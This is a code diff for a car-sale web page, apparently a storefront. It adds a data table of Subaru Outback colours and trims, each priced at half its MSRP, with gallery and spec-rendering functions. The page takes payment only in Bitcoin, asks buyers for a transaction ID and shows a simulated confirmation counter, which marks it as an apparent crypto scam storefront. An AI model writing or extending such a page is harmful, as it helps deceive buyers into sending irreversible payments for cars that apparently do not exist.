+          engine: "2.5L BOXER 4-Cyl",
+          horsepower: "182 HP @ 5,800 RPM",
+          torque: "176 lb-ft @ 4,400 RPM",
+          transmission: "Lineartronic CVT",
+          drivetrain: "Symmetrical AWD",
+          mpg: "26 City / 33 Hwy",
+          clearance: "8.7 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "2,700 lbs",
+          safety: "EyeSight Basic",
+          infotainment: "Dual 7\" Touchscreens",
+          audio: "6 Speakers",
+          seating: "Cloth, 6-Way Manual",
+          wheels: "17\" Steel"
+        }
+      },
+      gray: {
+        name: "Magnetite Gray Metallic",
+        config: "Premium",
+        images: [
+          "outback-gray-1.jpg",
+          "outback-gray-2.jpg",
+          "outback-gray-3.jpg",
+          "outback-gray-4.jpg",
+          "outback-gray-5.jpg"
+        ],
+        msrp: 37495,
+        price: 18747.50,
+        monthly: 146,
+        specs: {
+          engine: "2.5L BOXER 4-Cyl",
+          horsepower: "182 HP @ 5,800 RPM",
+          torque: "176 lb-ft @ 4,400 RPM",
+          transmission: "Lineartronic CVT",
+          drivetrain: "Symmetrical AWD",
+          mpg: "26 City / 32 Hwy",
+          clearance: "8.7 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "3,500 lbs",
+          safety: "EyeSight + Blind Spot",
+          infotainment: "11.6\" Touchscreen",
+          audio: "6 Speakers",
+          seating: "Leather, Heated Front",
+          wheels: "18\" Alloy"
+        }
+      },
+      green: {
+        name: "Autumn Green Metallic",
+        config: "Wilderness",
+        images: [
+          "outback-green-1.jpg",
+          "outback-green-2.jpg",
+          "outback-green-3.jpg",
+          "outback-green-4.jpg",
+          "outback-green-5.jpg"
+        ],
+        msrp: 42495,
+        price: 21247.50,
+        monthly: 166,
+        specs: {
+          engine: "2.4L Turbo BOXER",
+          horsepower: "260 HP @ 5,600 RPM",
+          torque: "277 lb-ft @ 2,000 RPM",
+          transmission: "High-Torque CVT",
+          drivetrain: "Symmetrical AWD + X-MODE",
+          mpg: "22 City / 26 Hwy",
+          clearance: "9.5 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "3,500 lbs",
+          safety: "EyeSight + Off-Road Assist",
+          infotainment: "11.6\" Touchscreen + NAV",
+          audio: "8 Speakers",
+          seating: "StarTex, Heated Front/Rear",
+          wheels: "17\" Off-Road Alloy"
+        }
+      },
+      wilderness: {
+        name: "Wilderness Green",
+        config: "Off-Road Edition",
+        images: [
+          "outback-wilderness-1.jpg",
+          "outback-wilderness-2.jpg",
+          "outback-wilderness-3.jpg",
+          "outback-wilderness-4.jpg",
+          "outback-wilderness-5.jpg"
+        ],
+        msrp: 45995,
+        price: 22997.50,
+        monthly: 180,
+        specs: {
+          engine: "2.4L Turbo BOXER",
+          horsepower: "260 HP @ 5,600 RPM",
+          torque: "277 lb-ft @ 2,000 RPM",
+          transmission: "High-Torque CVT",
+          drivetrain: "AWD + Dual X-MODE",
+          mpg: "21 City / 26 Hwy",
+          clearance: "9.5 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "3,500 lbs",
+          safety: "EyeSight + Terrain Monitor",
+          infotainment: "11.6\" Touchscreen + NAV",
+          audio: "Harman Kardon 12 Speakers",
+          seating: "StarTex Waterproof, Heated",
+          wheels: "17\" Black Off-Road"
+        }
+      },
+      bronze: {
+        name: "Brilliant Bronze Metallic",
+        config: "Touring XT",
+        images: [
+          "outback-bronze-1.jpg",
+          "outback-bronze-2.jpg",
+          "outback-bronze-3.jpg",
+          "outback-bronze-4.jpg",
+          "outback-bronze-5.jpg"
+        ],
+        msrp: 44995,
+        price: 22497.50,
+        monthly: 176,
+        specs: {
+          engine: "2.4L Turbo BOXER",
+          horsepower: "260 HP @ 5,600 RPM",
+          torque: "277 lb-ft @ 2,000 RPM",
+          transmission: "Lineartronic CVT",
+          drivetrain: "Symmetrical AWD",
+          mpg: "23 City / 27 Hwy",
+          clearance: "8.7 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "3,500 lbs",
+          safety: "EyeSight 360 + DriverFocus",
+          infotainment: "11.6\" + Harman Kardon",
+          audio: "12 Speakers + Subwoofer",
+          seating: "Nappa Leather, Ventilated",
+          wheels: "19\" Alloy"
+        }
+      },
+      cascade: {
+        name: "Cascade Green Metallic",
+        config: "Onyx Edition",
+        images: [
+          "outback-cascade-1.jpg",
+          "outback-cascade-2.jpg",
+          "outback-cascade-3.jpg",
+          "outback-cascade-4.jpg",
+          "outback-cascade-5.jpg"
+        ],
+        msrp: 37495,
+        price: 18747.50,
+        monthly: 146,
+        specs: {
+          engine: "2.5L BOXER 4-Cyl",
+          horsepower: "182 HP @ 5,800 RPM",
+          torque: "176 lb-ft @ 4,400 RPM",
+          transmission: "Lineartronic CVT",
+          drivetrain: "Symmetrical AWD + X-MODE",
+          mpg: "26 City / 32 Hwy",
+          clearance: "8.7 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "3,500 lbs",
+          safety: "EyeSight + Reverse Auto Brake",
+          infotainment: "11.6\" Touchscreen",
+          audio: "8 Speakers",
+          seating: "StarTex, Heated Front/Rear",
+          wheels: "18\" Black Alloy"
+        }
+      },
+      red: {
+        name: "Crimson Red Pearl",
+        config: "Touring",
+        images: [
+          "outback-red-1.jpg",
+          "outback-red-2.jpg",
+          "outback-red-3.jpg",
+          "outback-red-4.jpg",
+          "outback-red-5.jpg"
+        ],
+        msrp: 40995,
+        price: 20497.50,
+        monthly: 160,
+        specs: {
+          engine: "2.5L BOXER 4-Cyl",
+          horsepower: "182 HP @ 5,800 RPM",
+          torque: "176 lb-ft @ 4,400 RPM",
+          transmission: "Lineartronic CVT",
+          drivetrain: "Symmetrical AWD",
+          mpg: "25 City / 31 Hwy",
+          clearance: "8.7 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "3,500 lbs",
+          safety: "EyeSight 360 + Traffic Jam Assist",
+          infotainment: "11.6\" + NAV",
+          audio: "Harman Kardon 12 Speakers",
+          seating: "Leather, Heated/Ventilated",
+          wheels: "18\" Alloy"
+        }
+      },
+      blue: {
+        name: "Midnight Blue Pearl",
+        config: "Limited XT",
+        images: [
+          "outback-blue-1.jpg",
+          "outback-blue-2.jpg",
+          "outback-blue-3.jpg",
+          "outback-blue-4.jpg",
+          "outback-blue-5.jpg"
+        ],
+        msrp: 43495,
+        price: 21747.50,
+        monthly: 170,
+        specs: {
+          engine: "2.4L Turbo BOXER",
+          horsepower: "260 HP @ 5,600 RPM",
+          torque: "277 lb-ft @ 2,000 RPM",
+          transmission: "Lineartronic CVT",
+          drivetrain: "Symmetrical AWD",
+          mpg: "23 City / 27 Hwy",
+          clearance: "8.7 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "3,500 lbs",
+          safety: "EyeSight 360 + Tech Package",
+          infotainment: "11.6\" + NAV + WiFi",
+          audio: "Harman Kardon 12 Speakers",
+          seating: "Leather, Heated/Ventilated",
+          wheels: "19\" Alloy"
+        }
+      },
+      tungsten: {
+        name: "Tungsten Metallic",
+        config: "Winter Package",
+        images: [
+          "outback-tungsten-1.jpg",
+          "outback-tungsten-2.jpg",
+          "outback-tungsten-3.jpg",
+          "outback-tungsten-4.jpg",
+          "outback-tungsten-5.jpg"
+        ],
+        msrp: 38495,
+        price: 19247.50,
+        monthly: 150,
+        specs: {
+          engine: "2.5L BOXER 4-Cyl",
+          horsepower: "182 HP @ 5,800 RPM",
+          torque: "176 lb-ft @ 4,400 RPM",
+          transmission: "Lineartronic CVT",
+          drivetrain: "Symmetrical AWD + Snow Mode",
+          mpg: "26 City / 32 Hwy",
+          clearance: "8.7 inches",
+          cargo: "32.5 cu ft / 75.7 cu ft",
+          towing: "3,500 lbs",
+          safety: "EyeSight + Winter Assist",
+          infotainment: "11.6\" Touchscreen",
+          audio: "8 Speakers",
+          seating: "Heated Leather, All Seats",
+          wheels: "18\" Winter Alloy"
+        }
+      }
+    };
+
+    let selectedCar = 'white';
+    let currentImageIndex = 0;
+    let selectedAmount = carData.white.price;
+    let selectedPaymentOption = 1;
     let btcPrice = 65000;
     let timerInterval;
     let confirmationInterval;
 
-    function selectOption(opt) {
-      selectedAmount = opt === 1 ? 17497.50 : 8748.75;
+    function renderGallery() {
+      const car = carData[selectedCar];
+      const gallery = document.getElementById('imageGallery');
+      gallery.innerHTML = '';
+      
+      car.images.forEach((img, index) => {
+        const thumb = document.createElement('img');
+        thumb.src = img;
+        thumb.className = `gallery-thumb rounded h-16 object-cover border-2 ${index === currentImageIndex ? 'active border-blue-600' : 'border-gray-200'}`;
+        thumb.onclick = () => setImage(index);
+        gallery.appendChild(thumb);
+      });
+    }
+
+    function setImage(index) {
+      currentImageIndex = index;
+      const car = carData[selectedCar];
+      document.getElementById('selectedCarImage').src = car.images[index];
+      document.getElementById('currentImageIndex').textContent = index + 1;
+      renderGallery();
+    }
+
+    function nextImage() {
+      const car = carData[selectedCar];
+      currentImageIndex = (currentImageIndex + 1) % car.images.length;
+      setImage(currentImageIndex);
+    }
+
+    function prevImage() {
+      const car = carData[selectedCar];
+      currentImageIndex = (currentImageIndex - 1 + car.images.length) % car.images.length;
+      setImage(currentImageIndex);
+    }
+
+    function selectCar(carKey) {
+      selectedCar = carKey;
+      currentImageIndex = 0;
+      const car = carData[carKey];
+      selectedAmount = car.price;
+      
+      // Update visual selection
+      document.querySelectorAll('.car-card').forEach(card => {
+        card.classList.remove('selected');
+      });
+      event.currentTarget.classList.add('selected');
+      
+      // Update main image
+      document.getElementById('selectedCarImage').src = car.images[0];
+      document.getElementById('currentImageIndex').textContent = '1';
+      
+      // Update header info
+      document.getElementById('selectedCarColor').textContent = car.name;
+      document.getElementById('selectedCarMSRP').textContent = 'MSRP: $' + car.msrp.toLocaleString() + '.00';
+      document.getElementById('selectedCarPrice').textContent = '$' + car.price.toLocaleString();
+      document.getElementById('specsColorBadge').textContent = car.name;
+      
+      // Render gallery
+      renderGallery();
+      
+      // Update specs
+      const specsHtml = `
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Configuration:</span><span class="font-semibold text-gray-800">${car.config}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Exterior Color:</span><span class="font-semibold text-gray-800">${car.name}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Engine:</span><span class="font-semibold text-gray-800">${car.specs.engine}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Horsepower:</span><span class="font-semibold text-gray-800">${car.specs.horsepower}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Torque:</span><span class="font-semibold text-gray-800">${car.specs.torque}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Transmission:</span><span class="font-semibold text-gray-800">${car.specs.transmission}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Drivetrain:</span><span class="font-semibold text-gray-800">${car.specs.drivetrain}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Fuel Economy:</span><span class="font-semibold text-gray-800">${car.specs.mpg}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Ground Clearance:</span><span class="font-semibold text-gray-800">${car.specs.clearance}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Cargo Space:</span><span class="font-semibold text-gray-800">${car.specs.cargo}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Towing Capacity:</span><span class="font-semibold text-gray-800">${car.specs.towing}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Safety System:</span><span class="font-semibold text-gray-800">${car.specs.safety}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Infotainment:</span><span class="font-semibold text-gray-800">${car.specs.infotainment}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Audio System:</span><span class="font-semibold text-gray-800">${car.specs.audio}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Seating:</span><span class="font-semibold text-gray-800">${car.specs.seating}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2 border-b"><span>Wheels:</span><span class="font-semibold text-gray-800">${car.specs.wheels}</span></div>
+        <div class="spec-row flex justify-between px-4 py-2"><span>Delivery:</span><span class="font-semibold text-gray-800">Direct Home Delivery</span></div>
+      `;
+      document.getElementById('carSpecs').innerHTML = specsHtml;
+      
+      // Update payment options
+      updatePaymentOptions();
+    }
+
+    function updatePaymentOptions() {
+      const car = carData[selectedCar];
+      const fullPrice = car.price;
+      const halfPrice = car.price / 2;
+      
+      document.getElementById('option1Price').textContent = '$' + fullPrice.toLocaleString();
+      document.getElementById('option2Price').textContent = '$' + halfPrice.toLocaleString();
+      document.getElementById('monthlyPayment').textContent = '~$' + car.monthly + ' / month remaining';
+      
+      selectedAmount = selectedPaymentOption === 1 ? fullPrice : halfPrice;
+    }
+
+    function selectPaymentOption(opt) {
+      selectedPaymentOption = opt;
+      const car = carData[selectedCar];
+      selectedAmount = opt === 1 ? car.price : car.price / 2;
+      
       document.getElementById('card-option1').className = opt === 1 ? 
         "block border-2 border-blue-600 bg-blue-50/50 p-3.5 rounded-xl cursor-pointer transition-all" :
         "block border-2 border-gray-200 p-3.5 rounded-xl cursor-pointer transition-all hover:border-gray-300";
@@ -413,7 +1019,11 @@
       document.getElementById('popup-1').classList.add('hidden');
       document.getElementById('popup-2').classList.remove('hidden');
       
-      const plan = selectedAmount === 17497.50 ? '100% Upfront' : '50% Upfront';
+      const car = carData[selectedCar];
+      const plan = selectedPaymentOption === 1 ? '100% Upfront' : '50% Upfront';
+      
+      document.getElementById('payment-car-color').textContent = car.name;
+      document.getElementById('payment-car-config').textContent = car.config;
       document.getElementById('summary-plan').textContent = plan;
       document.getElementById('summary-amount').textContent = '$' + selectedAmount.toLocaleString();
       document.getElementById('crypto-usd').textContent = '$' + selectedAmount.toLocaleString();
@@ -441,9 +1051,12 @@
         return;
       }
       
+      const car = carData[selectedCar];
+      
       document.getElementById('popup-2').classList.add('hidden');
       document.getElementById('popup-3').classList.remove('hidden');
       
+      document.getElementById('processing-color').textContent = car.name;
       document.getElementById('processing-amount').textContent = '$' + selectedAmount.toLocaleString();
       document.getElementById('processing-btc').textContent = document.getElementById('crypto-btc').textContent;
       document.getElementById('processing-txid').textContent = txid.substring(0, 25) + '...';
@@ -454,7 +1067,10 @@
         document.getElementById('confirmations').textContent = confs + '/6';
       }, 30000);
     }
+
+    // Initialize
+    selectCar('white');
   </script>
 
 </body>
-                    </html>
+              </html>
